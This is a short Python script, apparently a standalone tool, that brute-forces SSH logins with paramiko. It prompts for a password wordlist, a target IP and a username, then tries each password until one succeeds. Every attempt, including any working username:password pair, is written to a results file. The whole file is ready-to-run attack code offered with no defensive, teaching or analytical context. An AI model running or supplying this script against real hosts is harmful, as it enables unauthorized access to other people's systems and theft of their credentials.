import os

import paramiko


def save_results_to_file(base_name, results):
    results_dir = "results"
    os.makedirs(results_dir, exist_ok=True)

    count = 0
    while True:
        filename = f"{base_name}{count}.txt" if count > 0 else f"{base_name}.txt"
        filepath = os.path.join(results_dir, filename)
        if not os.path.exists(filepath):
            break
        count += 1

    try:
        with open(filepath, 'a') as f:
            for result in results:
                f.write(result + '\n')
        print(f"Results saved in {filepath}")
    except Exception as e:
        print(f"Error writing file: {e}")


def ssh_brute_force():
    print("SSH Brute Force")
    print("You need a text file containing a list of passwords (one per line). Example: passwords.txt")
    password_file = input("Enter the path to the password file (e.g., passwords.txt): ")

    try:
        with open(password_file, 'r') as file:
            password_list = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: The file '{password_file}' was not found.")
        return

    target_ip = input("Enter target IP address: ")
    username = input("Enter SSH username: ")

    results = []
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password)
            result_str = f"Success: {username}:{password}"
            print(result_str)
            results.append(result_str)
            break
        except paramiko.AuthenticationException:
            result_str = f"Failed: {username}:{password}"
            print(result_str)
            results.append(result_str)
        except Exception as e:
            print(f"Error: {str(e)}")

    # Salva i risultati in un file
    save_results_to_file("ssh_brute_force_results", results)


ssh_brute_force()
